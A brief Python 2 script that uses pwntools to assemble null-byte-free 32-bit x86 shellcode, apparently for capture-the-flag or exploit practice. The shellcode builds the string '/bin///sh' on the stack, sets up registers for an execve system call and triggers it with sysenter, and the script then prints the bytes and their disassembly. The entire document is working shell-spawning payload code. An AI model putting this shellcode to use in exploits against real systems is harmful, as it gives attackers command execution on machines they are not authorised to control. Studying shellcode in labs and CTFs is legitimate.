#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import asm, disasm

sc = "push 0x68;"
sc += "push 0x732f2f2f;"
sc += "push 0x6e69622f;"

sc += "push esp;"
sc += "pop ebx;"

sc += "push 0x44;"
sc += "pop ecx;"
sc += "sub cl, 0x44;"

sc += "push 0x44;"
sc += "pop edx;"
sc += "sub dl, 0x44;"


sc += "push 0x7e7e7e7e;"
sc += "pop eax;"
sc += "sub eax, 0x7e7e7e73;"

sc += "sysenter;"

shellcode = asm(sc)
print shellcode
print disasm(shellcode)
